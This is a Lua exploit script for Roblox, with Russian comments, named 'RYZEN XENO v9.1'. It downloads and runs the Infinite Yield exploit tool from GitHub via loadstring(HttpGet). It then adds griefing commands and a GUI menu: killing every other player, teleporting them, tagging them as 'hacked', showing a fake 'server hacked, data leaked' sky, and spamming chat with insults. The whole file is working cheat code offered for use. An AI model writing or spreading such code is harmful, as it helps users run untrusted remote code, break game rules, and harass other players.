-- ============================================================
-- 🎃 RYZEN XENO v9.1 — INFINITE YIELD + ГЛОБАЛЬНЫЙ ВЗЛОМ
-- ВСЕ ФУНКЦИИ IY + НАШИ ГЛОБАЛЬНЫЕ ЭФФЕКТЫ
-- ============================================================

-- 1. ЗАГРУЗКА INFINITE YIELD (ОСНОВНАЯ ВЕРСИЯ)
print("🎃 Загрузка Infinite Yield...")
loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()

-- Ждём, пока IY загрузится и создаст глобальные функции
repeat task.wait() until type(getgenv().IY_LOADED) == "boolean" and getgenv().IY_LOADED == true
print("✅ Infinite Yield загружен!")

-- ============================================================
-- 2. ДОБАВЛЯЕМ НАШИ ГЛОБАЛЬНЫЕ КОМАНДЫ В IY
-- ============================================================

-- Получаем доступ к функциям IY (они уже в _G)
local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local Lighting = game:GetService("Lighting")
local RunService = game:GetService("RunService")
local TweenService = game:GetService("TweenService")
local player = Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Функция отправки глобального сообщения (IY уже имеет chatMessage, но мы создадим свою для удобства)
local function sendGlobalChat(msg)
    if chatMessage then
        chatMessage(msg)
    else
        -- fallback
        pcall(function()
            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg, "All")
        end)
    end
end

-- ============================================================
-- ГЛОБАЛЬНАЯ СИРЕНА
-- ============================================================
local function globalSiren()
    local sound = Instance.new("Sound")
    sound.SoundId = "rbxassetid://9120385565"
    sound.Volume = 1
    sound.Parent = Workspace
    pcall(function() sound:Play() end)
    task.wait(5)
    sound:Destroy()
    sendGlobalChat("🔊 " .. player.Name .. " ВКЛЮЧИЛ СИРЕНУ!")
end

-- ============================================================
-- ТЕГ "ВЗЛОМАНО" НАД ГОЛОВАМИ ВСЕХ (Part в Workspace)
-- ============================================================
local tagParts = {}
local function globalTag()
    for _, part in pairs(tagParts) do pcall(function() part:Destroy() end) end
    tagParts = {}
    for _, p in pairs(Players:GetPlayers()) do
        if p ~= player and p.Character then
            local head = p.Character:FindFirstChild("Head")
            if head then
                local part = Instance.new("Part")
                part.Name = "HackerTag"
                part.Size = Vector3.new(3, 0.5, 3)
                part.Position = head.Position + Vector3.new(0, 3, 0)
                part.Anchored = true
                part.CanCollide = false
                part.Transparency = 0.5
                part.BrickColor = BrickColor.Red()
                part.Parent = Workspace
                local gui = Instance.new("SurfaceGui")
                gui.Parent = part
                gui.Face = Enum.NormalId.Top
                gui.AlwaysOnTop = true
                local label = Instance.new("TextLabel")
                label.Size = UDim2.new(1, 0, 1, 0)
                label.BackgroundTransparency = 1
                label.Text = "⚠️ ВЗЛОМАНО ⚠️"
                label.TextColor3 = Color3.fromRGB(255, 0, 0)
                label.TextScaled = true
                label.Font = Enum.Font.GothamBold
                label.Parent = gui
                local conn
                conn = RunService.Heartbeat:Connect(function()
                    if p.Character and p.Character:FindFirstChild("Head") then
                        part.Position = p.Character.Head.Position + Vector3.new(0, 3, 0)
                    else
                        part:Destroy()
                        conn:Disconnect()
                    end
                end)
                table.insert(tagParts, part)
            end
        end
    end
    sendGlobalChat("👾 " .. player.Name .. " ДОБАВИЛ ТЕГИ ВСЕМ!")
end

-- ============================================================
-- УБИТЬ ВСЕХ (через Health)
-- ============================================================
local function globalKill()
    for _, p in pairs(Players:GetPlayers()) do
        if p ~= player and p.Character then
            local hum = p.Character:FindFirstChild("Humanoid")
            if hum then
                pcall(function() hum.Health = 0 end)
            end
        end
    end
    sendGlobalChat("💀 " .. player.Name .. " УБИЛ ВСЕХ ИГРОКОВ!")
end

-- ============================================================
-- ТЕЛЕПОРТ ВСЕХ В ЦЕНТР
-- ============================================================
local function globalTeleport()
    local center = Vector3.new(0, 10, 0)
    for _, p in pairs(Players:GetPlayers()) do
        if p ~= player and p.Character then
            local root = p.Character:FindFirstChild("HumanoidRootPart")
            if root then
                pcall(function() root.CFrame = CFrame.new(center + Vector3.new(math.random(-3, 3), 0, math.random(-3, 3))) end)
            end
        end
    end
    if character and character:FindFirstChild("HumanoidRootPart") then
        pcall(function() character.HumanoidRootPart.CFrame = CFrame.new(center + Vector3.new(0, 15, 0)) end)
    end
    sendGlobalChat("🌀 " .. player.Name .. " СОБРАЛ ВСЕХ В ЦЕНТРЕ!")
end

-- ============================================================
-- КРАСНОЕ НЕБО И ФОНОВЫЙ ТЕКСТ
-- ============================================================
local redSkyPart = nil
local function globalRedSky()
    -- Изменяем освещение
    Lighting.Ambient = Color3.fromRGB(255, 0, 0)
    Lighting.OutdoorAmbient = Color3.fromRGB(255, 0, 0)
    Lighting.Brightness = 2
    Lighting.FogColor = Color3.fromRGB(255, 0, 0)
    Lighting.FogEnd = 1000
    -- Создаём огромный красный Part с текстом
    if redSkyPart then redSkyPart:Destroy() end
    local part = Instance.new("Part")
    part.Name = "RedSky"
    part.Size = Vector3.new(1000, 1, 1000)
    part.Position = Vector3.new(0, 100, 0)
    part.Anchored = true
    part.CanCollide = false
    part.BrickColor = BrickColor.Red()
    part.Transparency = 0.3
    part.Parent = Workspace
    local gui = Instance.new("SurfaceGui")
    gui.Parent = part
    gui.Face = Enum.NormalId.Top
    gui.AlwaysOnTop = true
    local label = Instance.new("TextLabel")
    label.Size = UDim2.new(1, 0, 1, 0)
    label.BackgroundTransparency = 1
    label.Text = "⚠️ СЕРВЕР ВЗЛОМАН! ВСЕ ДАННЫЕ СЛИТЫ! ⚠️"
    label.TextColor3 = Color3.fromRGB(255, 255, 255)
    label.TextScaled = true
    label.Font = Enum.Font.GothamBold
    label.Parent = gui
    redSkyPart = part
    sendGlobalChat("🔥 " .. player.Name .. " АКТИВИРОВАЛ КРАСНОЕ НЕБО!")
end

-- ============================================================
-- МУЗЫКА (СВОЙ ТРЕК)
-- ============================================================
local music = nil
local function globalMusic()
    if music then
        music:Destroy()
        music = nil
        sendGlobalChat("🔇 " .. player.Name .. " ВЫКЛЮЧИЛ МУЗЫКУ")
        return
    end
    local sound = Instance.new("Sound")
    sound.SoundId = "rbxassetid://9120386436"  -- ЗАМЕНИ НА СВОЙ ID
    sound.Volume = 0.8
    sound.Looped = true
    sound.Parent = Workspace
    pcall(function() sound:Play() end)
    music = sound
    sendGlobalChat("🎵 " .. player.Name .. " ВКЛЮЧИЛ МУЗЫКУ!")
end

-- ============================================================
-- СПАМ В ЧАТ (15 сообщений)
-- ============================================================
local function globalSpam()
    for i = 1, 15 do
        sendGlobalChat("🔥 " .. player.Name .. " — ХАКЕР! ВСЕ ЛОХИ!")
        task.wait(0.3)
    end
end

-- ============================================================
-- МЕГА-ВЗЛОМ (ВСЁ ВМЕСТЕ)
-- ============================================================
local function megaHack()
    globalRedSky()
    task.wait(0.5)
    globalSiren()
    task.wait(0.5)
    globalTag()
    task.wait(0.5)
    globalTeleport()
    task.wait(0.5)
    globalKill()
    task.wait(0.5)
    globalSpam()
    task.wait(0.5)
    globalMusic()
    sendGlobalChat("💎 " .. player.Name .. " АКТИВИРОВАЛ МЕГА-ВЗЛОМ! ВСЕ УНИЧТОЖЕНЫ!")
end

-- ============================================================
-- 3. РЕГИСТРИРУЕМ КОМАНДЫ В IY (через addcmd)
-- ============================================================
-- Проверяем, что функция addcmd существует (она создаётся после загрузки IY)
if type(addcmd) == "function" then
    addcmd('megahack', {}, megaHack, nil)
    addcmd('siren', {}, globalSiren, nil)
    addcmd('tagall', {}, globalTag, nil)
    addcmd('killall', {}, globalKill, nil)
    addcmd('tptocenter', {}, globalTeleport, nil)
    addcmd('redsky', {}, globalRedSky, nil)
    addcmd('music', {}, globalMusic, nil)
    addcmd('spamglobal', {}, globalSpam, nil)
    print("✅ Глобальные команды добавлены в IY!")
else
    print("⚠️ addcmd не найдена! Команды не зарегистрированы.")
end

-- ============================================================
-- 4. ДОБАВЛЯЕМ ГУИ (КНОПКА С МЕНЮ)
-- ============================================================
-- Создаём отдельный GUI поверх IY, чтобы не мешать его работе.
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "RyzenXenoGUI"
screenGui.ResetOnSpawn = false
screenGui.Parent = player.PlayerGui

-- Кнопка открытия меню (красная тыква)
local openBtn = Instance.new("TextButton")
openBtn.Size = UDim2.new(0, 55, 0, 55)
openBtn.Position = UDim2.new(1, -65, 0.9, -30)
openBtn.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
openBtn.Text = "🎃"
openBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
openBtn.TextScaled = true
openBtn.Font = Enum.Font.GothamBold
openBtn.BorderSizePixel = 2
openBtn.BorderColor3 = Color3.fromRGB(255, 255, 255)
openBtn.Parent = screenGui

-- Меню
local menuFrame = Instance.new("Frame")
menuFrame.Size = UDim2.new(0, 260, 0, 350)
menuFrame.Position = UDim2.new(0.5, -130, 0.5, -175)
menuFrame.BackgroundColor3 = Color3.fromRGB(10, 10, 25)
menuFrame.BackgroundTransparency = 0.1
menuFrame.BorderSizePixel = 2
menuFrame.BorderColor3 = Color3.fromRGB(255, 0, 100)
menuFrame.Visible = false
menuFrame.ClipsDescendants = true
menuFrame.Parent = screenGui

-- Заголовок
local header = Instance.new("Frame")
header.Size = UDim2.new(1, 0, 0, 30)
header.BackgroundColor3 = Color3.fromRGB(200, 0, 50)
header.Parent = menuFrame

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, -30, 1, 0)
title.Position = UDim2.new(0, 5, 0, 0)
title.BackgroundTransparency = 1
title.Text = "🎃 RYZEN"
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.TextScaled = true
title.Font = Enum.Font.GothamBold
title.TextXAlignment = Enum.TextXAlignment.Left
title.Parent = header

local closeBtn = Instance.new("TextButton")
closeBtn.Size = UDim2.new(0, 25, 0, 25)
closeBtn.Position = UDim2.new(1, -30, 0, 3)
closeBtn.BackgroundColor3 = Color3.fromRGB(200, 0, 0)
closeBtn.Text = "✕"
closeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
closeBtn.TextScaled = true
closeBtn.Font = Enum.Font.GothamBold
closeBtn.Parent = header
closeBtn.MouseButton1Click:Connect(function() menuFrame.Visible = false end)

-- Скролл для кнопок
local scroll = Instance.new("ScrollingFrame")
scroll.Size = UDim2.new(1, -10, 1, -40)
scroll.Position = UDim2.new(0, 5, 0, 35)
scroll.BackgroundTransparency = 1
scroll.ScrollBarThickness = 4
scroll.CanvasSize = UDim2.new(0, 0, 0, 0)
scroll.Parent = menuFrame

local yPos = 5
local function AddButton(text, color, func)
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(1, -10, 0, 32)
    btn.Position = UDim2.new(0, 5, 0, yPos)
    btn.BackgroundColor3 = color
    btn.BackgroundTransparency = 0.2
    btn.Text = text
    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
    btn.TextScaled = true
    btn.Font = Enum.Font.Gotham
    btn.Parent = scroll
    btn.MouseButton1Click:Connect(func)
    yPos = yPos + 37
    scroll.CanvasSize = UDim2.new(0, 0, 0, yPos + 10)
    return btn
end

AddButton("🔊 СИРЕНА", Color3.fromRGB(200,0,0), globalSiren)
AddButton("👾 ТЕГ ВСЕМ", Color3.fromRGB(150,0,150), globalTag)
AddButton("💀 УБИТЬ ВСЕХ", Color3.fromRGB(255,0,0), globalKill)
AddButton("🌀 ТЕЛЕПОРТ ВСЕХ", Color3.fromRGB(200,150,0), globalTeleport)
AddButton("🎵 МУЗЫКА (ВКЛ/ВЫКЛ)", Color3.fromRGB(0,150,200), globalMusic)
AddButton("💬 СПАМ", Color3.fromRGB(200,100,0), globalSpam)
AddButton("🔥 КРАСНОЕ НЕБО", Color3.fromRGB(255,0,0), globalRedSky)
AddButton("💎 МЕГА-ВЗЛОМ", Color3.fromRGB(255,0,200), megaHack)
AddButton("❌ ЗАКРЫТЬ", Color3.fromRGB(100,100,100), function() menuFrame.Visible = false end)

openBtn.MouseButton1Click:Connect(function()
    menuFrame.Visible = not menuFrame.Visible
end)

-- Адаптация под телефон (увеличение кнопок)
if game:GetService("UserInputService").TouchEnabled then
    openBtn.Size = UDim2.new(0, 70, 0, 70)
    openBtn.Position = UDim2.new(1, -80, 0.85, -35)
    menuFrame.Size = UDim2.new(0, 300, 0, 400)
    menuFrame.Position = UDim2.new(0.5, -150, 0.4, -200)
end

-- ============================================================
-- 5. АВТОМАТИЧЕСКИЙ ЗАПУСК ПРИ СТАРТЕ (ОПЦИОНАЛЬНО)
-- ============================================================
task.wait(2)
sendGlobalChat("🎃 " .. player.Name .. " АКТИВИРОВАЛ RYZEN XENO + INFINITE YIELD!")
print("✅ СКРИПТ ЗАГРУЖЕН! НАЖМИ 🎃 ДЛЯ МЕНЮ.")
print("💡 ВСЕ КОМАНДЫ IY ДОСТУПНЫ ЧЕРЕЗ ПРЕФИКС ';' (по умолчанию)")
